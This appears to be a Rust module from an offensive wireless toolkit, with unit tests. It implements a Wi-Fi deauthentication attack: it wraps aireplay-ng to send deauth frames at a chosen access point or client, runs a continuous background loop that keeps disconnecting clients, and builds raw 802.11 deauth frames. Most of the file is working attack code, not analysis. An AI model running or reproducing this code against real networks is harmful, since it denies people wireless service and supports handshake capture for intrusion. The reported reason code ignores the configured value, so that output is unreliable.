use kraken_errors::WirelessError;
use serde::{Deserialize, Serialize};
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeauthStats {
    pub packets_sent: u64,
    pub clients_targeted: Vec<String>,
    pub duration_secs: f64,
    pub bssid: String,
    pub reason_code: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum DeauthReason {
    Unspecified = 1,
    AuthExpired = 2,
    Leaving = 3,
    Disconnected = 8,
    ApBusy = 5,
    ClassNotSupported = 10,
}

pub struct DeauthAttack {
    pub interface: String,
    pub bssid: String,
    pub client_mac: Option<String>,
    pub reason: DeauthReason,
    pub packet_count: u64,
    running: Arc<AtomicBool>,
}

impl DeauthAttack {
    pub fn new(interface: &str, bssid: &str) -> Self {
        DeauthAttack {
            interface: interface.to_string(),
            bssid: bssid.to_string(),
            client_mac: None,
            reason: DeauthReason::Disconnected,
            packet_count: 100,
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn with_client(mut self, client_mac: &str) -> Self {
        self.client_mac = Some(client_mac.to_string());
        self
    }

    pub fn with_reason(mut self, reason: DeauthReason) -> Self {
        self.reason = reason;
        self
    }

    pub fn with_packet_count(mut self, count: u64) -> Self {
        self.packet_count = count;
        self
    }

    pub fn start(&mut self) -> Result<DeauthStats, WirelessError> {
        self.running.store(true, Ordering::SeqCst);
        let start = std::time::Instant::now();

        let count_str = self.packet_count.to_string();
        let mut args = vec![
            "-i", &self.interface,
            "-a", &self.bssid,
            "-0", &count_str,
        ];

        if let Some(ref client) = self.client_mac {
            args.push("-c");
            args.push(client);
        }

        let output = Command::new("aireplay-ng")
            .args(&args)
            .output()
            .map_err(|e| WirelessError::Command(format!("aireplay-ng deauth failed: {}", e)))?;

        let duration = start.elapsed().as_secs_f64();

        let mut packets_sent = 0u64;
        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines() {
                if line.contains("sent") {
                    packets_sent = line.split_whitespace()
                        .find(|w| w.chars().all(|c| c.is_ascii_digit()))
                        .and_then(|s| s.parse().ok())
                        .unwrap_or(0);
                }
            }
        }

        Ok(DeauthStats {
            packets_sent,
            clients_targeted: self.client_mac.clone().map(|c| vec![c]).unwrap_or_default(),
            duration_secs: duration,
            bssid: self.bssid.clone(),
            reason_code: DeauthReason::Disconnected as u16,
        })
    }

    pub fn start_continuous(&mut self) -> Result<(), WirelessError> {
        self.running.store(true, Ordering::SeqCst);
        let running = self.running.clone();
        let interface = self.interface.clone();
        let bssid = self.bssid.clone();
        let client = self.client_mac.clone();

        thread::spawn(move || {
            while running.load(Ordering::SeqCst) {
                let mut args = vec![
                    "-i", &interface,
                    "-a", &bssid,
                    "-0", "1",
                ];

                if let Some(ref c) = client {
                    args.push("-c");
                    args.push(c);
                }

                let _ = Command::new("aireplay-ng")
                    .args(&args)
                    .output();

                thread::sleep(Duration::from_millis(500));
            }
        });

        Ok(())
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn build_raw_deauth_packet(bssid: &[u8; 6], client: &[u8; 6], reason: u16) -> Vec<u8> {
        let mut packet = Vec::with_capacity(26);
        packet.extend_from_slice(&[0xc0, 0x00]);
        packet.extend_from_slice(&[0x00, 0x00]);
        packet.extend_from_slice(client);
        packet.extend_from_slice(bssid);
        packet.extend_from_slice(bssid);
        packet.extend_from_slice(&[0x00, 0x00]);
        packet.extend_from_slice(&reason.to_le_bytes());
        packet
    }
}

pub fn format_deauth_stats(stats: &DeauthStats) -> String {
    let mut out = "Deauth Attack Results\n".to_string();
    out.push_str(&format!("BSSID: {}\n", stats.bssid));
    out.push_str(&format!("Packets sent: {}\n", stats.packets_sent));
    out.push_str(&format!("Duration: {:.2}s\n", stats.duration_secs));
    out.push_str(&format!("Reason code: {}\n", stats.reason_code));
    if !stats.clients_targeted.is_empty() {
        out.push_str(&format!("Clients: {}\n", stats.clients_targeted.join(", ")));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_deauth_packet() {
        let bssid = [0x00, 0x11, 0x22, 0x33, 0x44, 0x55];
        let client = [0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb];
        let packet = DeauthAttack::build_raw_deauth_packet(&bssid, &client, 3);
        assert_eq!(packet.len(), 26);
        assert_eq!(&packet[0..2], &[0xc0, 0x00]);
        assert_eq!(&packet[4..10], &client[..]);
        assert_eq!(&packet[10..16], &bssid[..]);
        assert_eq!(&packet[24..26], &[0x03, 0x00]);
    }

    #[test]
    fn test_deauth_reason_values() {
        assert_eq!(DeauthReason::Unspecified as u16, 1);
        assert_eq!(DeauthReason::Disconnected as u16, 8);
        assert_eq!(DeauthReason::Leaving as u16, 3);
    }

    #[test]
    fn test_deauth_stats_format() {
        let stats = DeauthStats {
            packets_sent: 50,
            clients_targeted: vec!["66:77:88:99:aa:bb".to_string()],
            duration_secs: 2.0,
            bssid: "00:11:22:33:44:55".to_string(),
            reason_code: 8,
        };
        let formatted = format_deauth_stats(&stats);
        assert!(formatted.contains("50"));
        assert!(formatted.contains("66:77:88:99:aa:bb"));
    }

    #[test]
    fn test_deauth_new() {
        let attack = DeauthAttack::new("wlan0", "00:11:22:33:44:55");
        assert_eq!(attack.bssid, "00:11:22:33:44:55");
        assert_eq!(attack.packet_count, 100);
    }

    #[test]
    fn test_with_client() {
        let attack = DeauthAttack::new("wlan0", "aa:bb:cc:dd:ee:ff")
            .with_client("11:22:33:44:55:66");
        assert_eq!(attack.client_mac, Some("11:22:33:44:55:66".to_string()));
    }

    #[test]
    fn test_with_reason() {
        let attack = DeauthAttack::new("wlan0", "aa:bb:cc:dd:ee:ff")
            .with_reason(DeauthReason::AuthExpired);
        assert!(matches!(attack.reason, DeauthReason::AuthExpired));
    }

    #[test]
    fn test_with_packet_count() {
        let attack = DeauthAttack::new("wlan0", "aa:bb:cc:dd:ee:ff")
            .with_packet_count(500);
        assert_eq!(attack.packet_count, 500);
    }

    #[test]
    fn test_deauth_builder_chain() {
        let attack = DeauthAttack::new("wlan0", "aa:bb:cc:dd:ee:ff")
            .with_client("11:22:33:44:55:66")
            .with_reason(DeauthReason::Leaving)
            .with_packet_count(200);
        assert_eq!(attack.client_mac, Some("11:22:33:44:55:66".to_string()));
        assert!(matches!(attack.reason, DeauthReason::Leaving));
        assert_eq!(attack.packet_count, 200);
    }

    #[test]
    fn test_deauth_reason_all_values() {
        assert_eq!(DeauthReason::Unspecified as u16, 1);
        assert_eq!(DeauthReason::AuthExpired as u16, 2);
        assert_eq!(DeauthReason::Leaving as u16, 3);
        assert_eq!(DeauthReason::ApBusy as u16, 5);
        assert_eq!(DeauthReason::Disconnected as u16, 8);
        assert_eq!(DeauthReason::ClassNotSupported as u16, 10);
    }

    #[test]
    fn test_deauth_stats_no_clients() {
        let stats = DeauthStats {
            packets_sent: 100,
            clients_targeted: vec![],
            duration_secs: 5.0,
            bssid: "00:11:22:33:44:55".to_string(),
            reason_code: 1,
        };
        let formatted = format_deauth_stats(&stats);
        assert!(!formatted.contains("Clients:"));
    }

    #[test]
    fn test_deauth_stats_multiple_clients() {
        let stats = DeauthStats {
            packets_sent: 50,
            clients_targeted: vec!["11:22:33:44:55:66".to_string(), "aa:bb:cc:dd:ee:ff".to_string()],
            duration_secs: 2.0,
            bssid: "00:11:22:33:44:55".to_string(),
            reason_code: 8,
        };
        let formatted = format_deauth_stats(&stats);
        assert!(formatted.contains("11:22:33:44:55:66"));
        assert!(formatted.contains("aa:bb:cc:dd:ee:ff"));
    }

    #[test]
    fn test_deauth_packet_reason_codes() {
        let bssid = [0x00, 0x11, 0x22, 0x33, 0x44, 0x55];
        let client = [0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb];

        let pkt1 = DeauthAttack::build_raw_deauth_packet(&bssid, &client, 1);
        assert_eq!(&pkt1[24..26], &[0x01, 0x00]);

        let pkt2 = DeauthAttack::build_raw_deauth_packet(&bssid, &client, 8);
        assert_eq!(&pkt2[24..26], &[0x08, 0x00]);

        let pkt3 = DeauthAttack::build_raw_deauth_packet(&bssid, &client, 10);
        assert_eq!(&pkt3[24..26], &[0x0a, 0x00]);
    }

    #[test]
    fn test_deauth_packet_frame_control() {
        let bssid = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
        let client = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
        let packet = DeauthAttack::build_raw_deauth_packet(&bssid, &client, 1);
        assert_eq!(packet[0], 0xc0);
        assert_eq!(packet[1], 0x00);
    }

    #[test]
    fn test_deauth_new_defaults() {
        let attack = DeauthAttack::new("wlan1", "aa:bb:cc:dd:ee:ff");
        assert_eq!(attack.interface, "wlan1");
        assert_eq!(attack.bssid, "aa:bb:cc:dd:ee:ff");
        assert!(attack.client_mac.is_none());
        assert!(matches!(attack.reason, DeauthReason::Disconnected));
    }
}
